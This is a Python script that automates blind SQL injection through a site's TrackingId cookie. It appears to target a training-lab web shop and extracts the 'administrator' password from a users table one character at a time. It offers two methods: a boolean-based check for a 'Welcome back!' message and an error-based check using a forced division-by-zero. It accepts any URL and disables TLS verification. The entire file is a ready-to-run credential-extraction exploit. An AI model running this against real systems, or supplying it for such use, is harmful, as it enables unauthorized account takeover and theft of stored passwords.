import sys
from tkinter import E
import requests
import urllib3
import re
import string
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_session(url):
    if url[len(url)-1] == "/":
        url=url[:-1]


    print("[?] getting the session")
    r = requests.get(url, verify=False)

    d = dict();
    d["TrackingId"]=r.cookies["TrackingId"];
    d["session"]=r.cookies["session"];

    return d

def brute_force_letter_2(url,num,session_data):
    if url[len(url)-1] == "/":
        url=url[:-1]

    path = '/filter?category=Corporate+gifts'

    for letter in list(string.ascii_lowercase + string.digits):
        sql_payload = "'|| (SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE '' end from users where username='administrator' and SUBSTR(password,%s,1)='%s') ||'" % (num, letter)
        
        cookies= {
            'TrackingId':session_data['TrackingId']+sql_payload,
            'session':session_data['session']
        }
        # Verify false to not verify tls certificates
        r = requests.get(url + path, cookies=cookies, verify=False)
        
        if r.status_code == 500:
            print("[+] found:(%s,%s)" % (num,letter))
            return letter

def brute_force_letter(url,num,session_data):
    if url[len(url)-1] == "/":
        url=url[:-1]

    path = '/filter?category=Clothing%2c+shoes+and+accessories'

    for letter in list(string.ascii_lowercase + string.digits):
        sql_payload = "'AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'),+%s,+1)='%s'--" % (num, letter)
        
        cookies= {
            'TrackingId':session_data['TrackingId']+sql_payload,
            'session':session_data['session']
        }
        # Verify false to not verify tls certificates
        r = requests.get(url + path, cookies=cookies, verify=False)

        if "Welcome back!" in r.text:
            print("[+] found:(%s,%s)" % (num,letter))
            return letter
            

def brute_force_password(url):
    print("[?] Running 'brute_force_password'")
    
    if url[len(url)-1] == "/":
        url=url[:-1]

    session_data = get_session(url)
    admin_password=""

    for num in range(1,21,1):
        l = brute_force_letter_2(url,num,session_data)
        if l:
            admin_password+= l
            continue
           
    print("[+] The Administrator password is '%s'." % admin_password)



if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage : %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    print("[+] Dumping the list of usernames and passwords...")

    brute_force_password(url)